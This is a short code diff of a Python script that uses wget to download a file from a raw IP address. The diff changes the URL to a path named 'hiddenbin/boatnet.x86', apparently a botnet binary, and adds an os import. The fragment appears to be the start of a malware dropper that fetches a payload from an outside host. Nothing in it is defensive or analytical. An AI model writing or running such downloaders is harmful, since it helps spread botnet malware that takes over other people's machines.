@@ -1,6 +1,7 @@
 import wget
+import os
 
-remote_url = 'http://45.95.146.91/test'
+remote_url = 'http://195.58.39.170/hiddenbin/boatnet.x86'
 
 local_file = 'test'
 
